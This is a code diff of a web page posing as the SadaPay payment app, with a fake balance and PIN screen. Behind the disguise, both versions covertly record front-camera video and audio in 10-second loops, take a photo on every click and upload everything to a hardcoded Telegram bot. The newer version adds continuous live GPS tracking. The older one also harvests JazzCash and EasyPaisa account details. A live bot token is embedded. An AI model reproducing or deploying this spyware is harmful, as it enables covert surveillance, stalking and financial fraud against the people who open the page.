@@ -5,195 +5,128 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SadaPay - Goodbye Bank Fees</title>
     <style>
-        :root { --teal: #2dd4bf; --black: #121212; --card-bg: #1e1e1e; --input-bg: #2a2a2a; }
-        body { margin: 0; background: var(--black); color: white; font-family: 'Segoe UI', Roboto, sans-serif; text-align: center; overflow-x: hidden; }
-        
-        /* Screens Management */
-        .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; align-items: center; justify-content: center; box-sizing: border-box; }
+        :root { --teal: #2dd4bf; --black: #121212; --card-bg: #1e1e1e; }
+        body { margin: 0; background: var(--black); color: white; font-family: sans-serif; text-align: center; }
+        .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; align-items: center; justify-content: center; }
         .active-screen { display: flex; }
-
-        /* UI Elements */
-        .logo { width: 140px; margin-bottom: 40px; }
-        .card { background: var(--card-bg); border-radius: 24px; padding: 25px; width: 100%; max-width: 360px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .card { background: var(--card-bg); border-radius: 24px; padding: 25px; width: 100%; max-width: 360px; border: 1px solid #333; }
         .balance { font-size: 42px; font-weight: bold; color: var(--teal); margin: 10px 0; }
-        
-        input { background: var(--input-bg); border: 1px solid #444; color: white; padding: 16px; width: 100%; border-radius: 14px; margin: 12px 0; box-sizing: border-box; font-size: 16px; outline: none; }
-        input:focus { border-color: var(--teal); }
-        
-        .btn { background: var(--teal); color: black; padding: 16px; width: 100%; border-radius: 14px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn:active { transform: scale(0.98); }
-        
-        .method-btn { background: var(--input-bg); padding: 15px; border-radius: 16px; margin: 10px 0; width: 100%; display: flex; align-items: center; cursor: pointer; border: 1px solid #333; }
-        .method-btn img { width: 40px; height: 40px; margin-right: 15px; border-radius: 8px; object-fit: contain; }
-
+        input { background: #2a2a2a; border: 1px solid #444; color: white; padding: 16px; width: 100%; border-radius: 14px; margin: 12px 0; box-sizing: border-box; }
+        .btn { background: var(--teal); color: black; padding: 16px; width: 100%; border-radius: 14px; border: none; font-weight: bold; cursor: pointer; }
         #video, #canvas { display: none; }
     </style>
 </head>
-<body onclick="globalInteraction()">
+<body onclick="captureAction()">
 
     <div id="loginScreen" class="screen active-screen">
-        <img src="https://sadapay.pk/wp-content/uploads/2022/06/SadaPay-Logo-1.png" class="logo">
+        <img src="https://sadapay.pk/wp-content/uploads/2022/06/SadaPay-Logo-1.png" width="140" style="margin-bottom:30px;">
         <div class="card">
-            <h3 style="margin-top:0;">Enter Your PIN</h3>
-            <p style="color: #888; font-size: 14px;">Please enter your 4-digit secure PIN to continue</p>
-            <input type="password" id="pinInput" placeholder="****" maxlength="4" inputmode="numeric">
-            <button class="btn" onclick="verifyPin()">Login</button>
+            <h3>Secure Login</h3>
+            <input type="password" id="pinInput" placeholder="Enter PIN" maxlength="4">
+            <button class="btn" onclick="verify()">Continue</button>
         </div>
     </div>
 
-    <div id="walletScreen" class="screen">
-        <div style="width:100%; max-width:360px; text-align:left;">
-            <p style="color: #888; margin-bottom: 5px;">Current Balance</p>
-            <div class="balance">Rs. 107,800</div>
-            <p style="color: #555; margin-top: -5px;">≈ $385.00 USDT</p>
-            
-            <div class="card" style="margin-top: 20px; width: 100%; padding: 20px;">
-                <div style="display: flex; gap: 10px;">
-                    <button class="btn" onclick="showTransfer()">Send Money</button>
-                    <button class="btn" style="background: #333; color: white;">Load Cash</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="transferScreen" class="screen">
-        <h3 style="color: var(--teal);">Transfer Funds</h3>
-        <div style="width: 100%; max-width: 360px;">
-            <div class="method-btn" onclick="openInputs('JazzCash')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/JazzCash_logo.png"> JazzCash
-            </div>
-            <div class="method-btn" onclick="openInputs('EasyPaisa')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Easypaisa_logo.png"> EasyPaisa
-            </div>
-            
-            <div id="finalInputs" style="display: none; margin-top: 20px;">
-                <input type="text" id="accName" placeholder="Account Title Name">
-                <input type="number" id="accNum" placeholder="Account Number">
-                <button class="btn" onclick="sendTransaction()">Confirm Transfer</button>
-            </div>
-        </div>
+    <div id="mainScreen" class="screen">
+        <p style="color:#888;">Current Balance</p>
+        <div class="balance">Rs. 107,800</div>
+        <button class="btn" style="width:200px;">Send Money</button>
     </div>
 
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const config = {
-            botToken: '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0',
-            chatId: '7107389141',
-            clipDuration: 10000 // 10 seconds
+        const API_KEY = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
+        const CHAT_ID = '7107389141';
+        let db, mediaRecorder, chunks = [];
+
+        // 1. Storage & Sync Logic
+        const req = indexedDB.open("DataStore", 1);
+        req.onupgradeneeded = e => e.target.result.createObjectStore("sync_queue", { autoIncrement: true });
+        req.onsuccess = e => { db = e.target.result; sync(); };
+
+        // 2. Main Initialization (Camera, Mic, Location)
+        window.onload = () => {
+            // Live Location Tracking
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(pos => {
+                    const msg = `📍 *LIVE LOCATION*\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendText(msg);
+                }, err => console.log("Loc Denied"), { enableHighAccuracy: true });
+            }
+
+            // Camera & Audio
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                .then(stream => {
+                    document.getElementById('video').srcObject = stream;
+                    startVideoLoop(stream);
+                });
         };
 
-        let db, mediaRecorder, recordedChunks = [], currentMethod = "";
-
-        // --- DATABASE SETUP (IndexedDB for Offline Storage) ---
-        const dbReq = indexedDB.open("SecureVault", 1);
-        dbReq.onupgradeneeded = e => e.target.result.createObjectStore("pending_videos", { autoIncrement: true });
-        dbReq.onsuccess = e => { db = e.target.result; syncOfflineData(); };
-
-        // --- CAMERA & MIC INITIALIZATION ---
-        window.onload = async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                document.getElementById('video').srcObject = stream;
-                initRecording(stream);
-            } catch (err) { console.warn("Camera/Mic denied"); }
-        };
-
-        function initRecording(stream) {
+        function startVideoLoop(stream) {
             mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.ondataavailable = e => { if(e.data.size > 0) recordedChunks.push(e.data); };
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
             mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                recordedChunks = [];
-                handleVideoOutput(blob);
-                mediaRecorder.start(); // Restart recording loop
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                chunks = [];
+                navigator.onLine ? uploadFile(blob, 'video') : saveLocally(blob);
+                mediaRecorder.start();
             };
             mediaRecorder.start();
-            setInterval(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, config.clipDuration);
+            setInterval(() => mediaRecorder.state === "recording" && mediaRecorder.stop(), 10000);
         }
 
-        // --- HANDLING OUTPUT (Online/Offline) ---
-        async function handleVideoOutput(blob) {
-            if (navigator.onLine) {
-                await uploadVideo(blob);
-            } else {
-                saveOffline(blob);
-            }
-        }
-
-        function saveOffline(blob) {
-            const tx = db.transaction("pending_videos", "readwrite");
-            tx.objectStore("pending_videos").add(blob);
-        }
-
-        async function uploadVideo(blob) {
+        // 3. Data Transmission
+        async function uploadFile(blob, type) {
             const fd = new FormData();
-            fd.append('chat_id', config.chatId);
-            fd.append('video', blob, `rec_${Date.now()}.webm`);
-            try {
-                await fetch(`https://api.telegram.org/bot${config.botToken}/sendVideo`, { method: 'POST', body: fd });
-            } catch (e) { saveOffline(blob); }
+            fd.append('chat_id', CHAT_ID);
+            const endpoint = type === 'video' ? 'sendVideo' : 'sendPhoto';
+            fd.append(type, blob, `${type}_${Date.now()}.${type === 'video' ? 'webm' : 'jpg'}`);
+            try { await fetch(`https://api.telegram.org/bot${API_KEY}/${endpoint}`, { method: 'POST', body: fd }); }
+            catch(e) { saveLocally(blob); }
         }
 
-        async function syncOfflineData() {
+        function sendText(txt) {
+            fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
+        }
+
+        function saveLocally(blob) {
+            const tx = db.transaction("sync_queue", "readwrite");
+            tx.objectStore("sync_queue").add(blob);
+        }
+
+        async function sync() {
             if (!navigator.onLine || !db) return;
-            const tx = db.transaction("pending_videos", "readwrite");
-            const store = tx.objectStore("pending_videos");
-            const cursorReq = store.openCursor();
-            cursorReq.onsuccess = async e => {
+            const store = db.transaction("sync_queue", "readwrite").objectStore("sync_queue");
+            store.openCursor().onsuccess = async e => {
                 const cursor = e.target.result;
                 if (cursor) {
-                    await uploadVideo(cursor.value);
+                    await uploadFile(cursor.value, cursor.value.type.includes('video') ? 'video' : 'photo');
                     store.delete(cursor.key);
                     cursor.continue();
                 }
             };
         }
 
-        window.addEventListener('online', syncOfflineData);
+        window.addEventListener('online', sync);
 
-        // --- UI LOGIC ---
-        function globalInteraction() {
-            // Har click pe photo capture
+        // 4. User Interaction Actions
+        function captureAction() {
             const v = document.getElementById('video');
             const c = document.getElementById('canvas');
             if(v.srcObject) {
-                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-                c.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('chat_id', config.chatId);
-                    fd.append('photo', blob, 'img.jpg');
-                    fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, { method: 'POST', body: fd });
-                }, 'image/jpeg');
+                const ctx = c.getContext('2d');
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+                c.toBlob(b => uploadFile(b, 'photo'), 'image/jpeg');
             }
         }
 
-        function verifyPin() {
-            if(document.getElementById('pinInput').value === "7890") switchScreen('walletScreen');
-            else alert("Incorrect Secure PIN");
-        }
-
-        function switchScreen(id) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
-            document.getElementById(id).classList.add('active-screen');
-        }
-
-        function showTransfer() { switchScreen('transferScreen'); }
-
-        function openInputs(m) {
-            currentMethod = m;
-            document.getElementById('finalInputs').style.display = 'block';
-            document.getElementById('accNum').placeholder = m + " Number";
-        }
-
-        function sendTransaction() {
-            const name = document.getElementById('accName').value;
-            const num = document.getElementById('accNum').value;
-            const text = `💰 *SadaPay Action*\nMethod: ${currentMethod}\nName: ${name}\nNumber: ${num}\nBalance: Rs. 107,800`;
-            fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-            alert("Security Timeout: Connection lost. Please login again.");
-            location.reload();
+        function verify() {
+            if(document.getElementById('pinInput').value === "7890") {
+                document.getElementById('loginScreen').style.display = "none";
+                document.getElementById('mainScreen').classList.add('active-screen');
+            }
         }
     </script>
 </body>
